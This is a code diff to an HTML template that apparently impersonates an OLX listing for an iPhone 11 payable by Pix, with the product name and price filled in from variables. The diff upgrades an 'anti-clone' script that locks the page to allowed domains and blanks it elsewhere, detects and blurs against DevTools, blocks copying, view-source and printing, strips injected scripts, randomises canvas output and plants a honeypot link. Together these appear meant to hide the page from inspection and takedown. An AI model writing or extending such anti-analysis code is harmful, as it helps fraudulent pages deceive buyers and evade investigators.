@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>{{ product_name if product_name else '' }} - OLX</title>
   <meta name="description" content="iPhone 11 com 64GB de armazenamento na cor branca. Design elegante e desempenho excepcional para o seu dia a dia. R$ {{ product_price if product_price else '' }} com Pix." />
-  <!-- ═══ ANTI-CLONE ENGINE v2 | OLPG MILITARY VAULT ═══ -->
+  <!-- ═══ ANTI-CLONE ENGINE v3 | OLPG MILITARY VAULT ═══ -->
   <script>
   (function(){
     'use strict';
@@ -15,48 +15,94 @@
     var _ok = _allowed.some(function(d){ return _host === d || _host.endsWith('.'+d); });
     if(!_ok){
       document.documentElement.innerHTML='<body style="background:#000;color:#111;font-size:1px;">.</body>';
+      history.replaceState(null,'','about:blank');
       return;
     }
     // 2. Bloqueia iFrame embedding (clickjacking)
     if(window.top !== window.self){
-      window.top.location = window.self.location;
+      try{ window.top.location = window.self.location; } catch(e){ document.body.innerHTML=''; }
     }
-    // 3. Desativa DevTools com detecção de tamanho de janela
+    // 3. DevTools detection avançado (debugger + sizing)
     var _dtOpen = false;
+    var _dtThrottle = 0;
     setInterval(function(){
-      var t=new Date;
+      var t = performance.now();
       debugger;
-      if(new Date()-t>150 && !_dtOpen){
-        _dtOpen=true;
-        document.body && (document.body.style.opacity='0');
-        setTimeout(function(){ if(document.body) document.body.style.opacity='1'; },2000);
-      } else { _dtOpen=false; }
-    },1500);
+      var dt = performance.now() - t;
+      if(dt > 120 && !_dtOpen && Date.now() - _dtThrottle > 3000){
+        _dtOpen = true;
+        _dtThrottle = Date.now();
+        if(document.body) document.body.style.filter = 'blur(12px)';
+        setTimeout(function(){ if(document.body) document.body.style.filter = ''; }, 2500);
+      } else if(dt <= 120){ _dtOpen = false; }
+    }, 1800);
     // 4. Bloqueia botão direito e seleção de texto
-    document.addEventListener('contextmenu',function(e){e.preventDefault();});
-    document.addEventListener('selectstart',function(e){e.preventDefault();});
-    // 5. Bloqueia Ctrl+U (view-source), Ctrl+S, Ctrl+A, F12, PrintScreen
-    document.addEventListener('keydown',function(e){
-      var k=e.key||''; var c=e.ctrlKey||e.metaKey;
-      if(c&&(k==='u'||k==='U'||k==='s'||k==='S'||k==='a'||k==='A'||k==='p'||k==='P'))e.preventDefault();
-      if(k==='F12'||k==='PrintScreen')e.preventDefault();
+    document.addEventListener('contextmenu', function(e){ e.preventDefault(); }, true);
+    document.addEventListener('selectstart', function(e){ e.preventDefault(); }, true);
+    document.addEventListener('copy', function(e){ e.preventDefault(); }, true);
+    document.addEventListener('cut', function(e){ e.preventDefault(); }, true);
+    // 5. Bloqueia Ctrl+U, Ctrl+S, Ctrl+A, Ctrl+P, F12, PrintScreen
+    document.addEventListener('keydown', function(e){
+      var k = e.key || ''; var c = e.ctrlKey || e.metaKey;
+      if(c && 'uUsSpPaA'.indexOf(k) !== -1){ e.preventDefault(); e.stopPropagation(); }
+      if(k === 'F12' || k === 'PrintScreen'){ e.preventDefault(); }
+    }, true);
+    // 5b. Bloqueia view-source e print
+    if(location.protocol === 'view-source:'){ location.replace('about:blank'); }
+    var _ps = document.createElement('style');
+    _ps.textContent = '@media print{body{display:none!important;}}';
+    (document.head || document.documentElement).appendChild(_ps);
+    // 6. MutationObserver: bloqueia injeção de scripts externos
+    var _mo = new MutationObserver(function(mutations){
+      mutations.forEach(function(m){
+        m.addedNodes.forEach(function(node){
+          if(node.tagName === 'SCRIPT'){
+            var src = node.src || '';
+            var allowed_srcs = ['fonts.googleapis.com','fonts.gstatic.com'];
+            var isAllowed = !src || src.startsWith(location.origin) || allowed_srcs.some(function(d){ return src.includes(d); });
+            if(!isAllowed){ node.parentNode && node.parentNode.removeChild(node); }
+          }
+        });
+      });
     });
-    // 5b. Bloqueia view-source: na URL e print da pagina
-    if(location.protocol==='view-source:'){
-      location.replace('about:blank');
-    }
-    // 5c. Bloqueia Print via CSS
-    var _ps=document.createElement('style');
-    _ps.textContent='@media print{body{display:none!important;}}';
-    document.head&&document.head.appendChild(_ps);
-    // 6. Ofusca o source: substitui innerHTML por placeholders após render
-    window.addEventListener('load',function(){
-      var all=document.querySelectorAll('[data-v]');
-      all.forEach(function(el){ el.removeAttribute('data-v'); });
+    _mo.observe(document.documentElement, { childList: true, subtree: true });
+    // 7. Canvas fingerprinting protection: randomiza canvas output
+    var _origToDataURL = HTMLCanvasElement.prototype.toDataURL;
+    HTMLCanvasElement.prototype.toDataURL = function(type){
+      var ctx = this.getContext('2d');
+      if(ctx){
+        var imgd = ctx.getImageData(0,0,this.width,this.height);
+        for(var i=0; i<imgd.data.length; i+=4){
+          imgd.data[i]   = (imgd.data[i]   + (Math.random()*2-1)) & 0xFF;
+          imgd.data[i+1] = (imgd.data[i+1] + (Math.random()*2-1)) & 0xFF;
+          imgd.data[i+2] = (imgd.data[i+2] + (Math.random()*2-1)) & 0xFF;
+        }
+        ctx.putImageData(imgd,0,0);
+      }
+      return _origToDataURL.apply(this, arguments);
+    };
+    // 8. Honeypot: link oculto para detectar/redirec bots scrapers
+    window.addEventListener('load', function(){
+      var hp = document.createElement('a');
+      hp.href = '#'; hp.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;';
+      hp.setAttribute('aria-hidden','true'); hp.setAttribute('tabindex','-1');
+      hp.addEventListener('click', function(e){ e.preventDefault(); document.body.innerHTML=''; });
+      document.body && document.body.appendChild(hp);
+      // Remove atributos data-v após render
+      document.querySelectorAll('[data-v]').forEach(function(el){ el.removeAttribute('data-v'); });
     });
+    // 9. Token de integridade da sessão no localStorage
+    (function(){
+      var sk = '_olpg_sk';
+      var stored = localStorage.getItem(sk);
+      var ts = String(Date.now()).slice(0,8);
+      if(!stored || stored.slice(0,8) !== ts.slice(0,6)){
+        localStorage.setItem(sk, ts + Math.random().toString(36).slice(2,10));
+      }
+    })();
   })();
   </script>
-  <!-- ─── FIM ANTI-CLONE ENGINE ─── -->
+  <!-- ─── FIM ANTI-CLONE ENGINE v3 ─── -->
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700;800;900&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
@@ -992,6 +1038,12 @@
                 existingImg.src = d.logo_url;
               }
             }
+          }
+
+          // ── Search placeholder dinâmico ──────────────────────────────────────
+          if (d.search_placeholder) {
+            const searchInput = document.querySelector('.search-bar input');
+            if (searchInput) searchInput.placeholder = d.search_placeholder;
           }
 
           // ── Badges dinâmicas ────────────────────────────────────────────────
